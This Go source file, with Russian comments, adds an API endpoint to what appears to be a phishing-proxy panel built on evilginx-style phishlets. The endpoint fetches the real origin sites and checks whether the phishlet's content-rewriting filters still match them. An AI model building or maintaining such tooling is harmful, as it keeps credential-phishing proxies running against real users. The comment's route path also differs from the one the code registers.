// Check phishlet живьем: дергает origin-хосты, сверяет sub_filters.
// POST /api/v1/phishlets/{id}/check -> [{host, http, bytes, hits, misses}]
package api

import (
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"time"
)

type hostCheck struct {
	Host   string   `json:"host"`
	HTTP   int      `json:"http"`
	Bytes  int      `json:"bytes"`
	Hits   []string `json:"hits"`
	Misses []string `json:"misses"`
	Err    string   `json:"error,omitempty"`
}

var checkClient = &http.Client{Timeout: 20 * time.Second}

// checkRoutes вешается рядом: POST /api/v1/phishlets/{id}/check.
// Вызывается из Handler (доступ к d.Store).
func checkRoutes(mux *http.ServeMux, d Deps, guard func(http.HandlerFunc) http.HandlerFunc) {
	mux.HandleFunc("/api/v1/phishlets-check/", guard(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method", http.StatusMethodNotAllowed)
			return
		}
		id := strings.Trim(strings.TrimPrefix(r.URL.Path, "/api/v1/phishlets-check/"), "/")
		if id == "" || strings.Contains(id, "/") {
			http.Error(w, "bad id", http.StatusBadRequest)
			return
		}
		ph := d.Store.FindByID(id)
		if ph == nil {
			http.Error(w, "unknown phishlet", http.StatusNotFound)
			return
		}
		out := []hostCheck{}
		for _, h := range ph.ProxyHosts {
			origin := h.OrigSub + "." + h.Domain
			hc := hostCheck{Host: origin}
			body, code, err := fetchOrigin(origin)
			if err != nil {
				hc.Err = err.Error()
				out = append(out, hc)
				continue
			}
			hc.HTTP, hc.Bytes = code, len(body)
			low := strings.ToLower(body)
			for _, f := range ph.SubFilters {
				if f.TriggersOn != "" && f.TriggersOn != origin {
					continue
				}
				if f.Search == "" {
					continue
				}
				if strings.Contains(low, strings.ToLower(f.Search)) {
					hc.Hits = append(hc.Hits, f.Search)
				} else {
					hc.Misses = append(hc.Misses, f.Search)
				}
			}
			out = append(out, hc)
		}
		_ = json.NewEncoder(w).Encode(out)
	}))
}

func fetchOrigin(host string) (string, int, error) {
	req, err := http.NewRequest(http.MethodGet, "https://"+host+"/", nil)
	if err != nil {
		return "", 0, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126")
	req.Header.Set("Accept-Language", "en-US")
	resp, err := checkClient.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return "", 0, err
	}
	return string(b), resp.StatusCode, nil
}
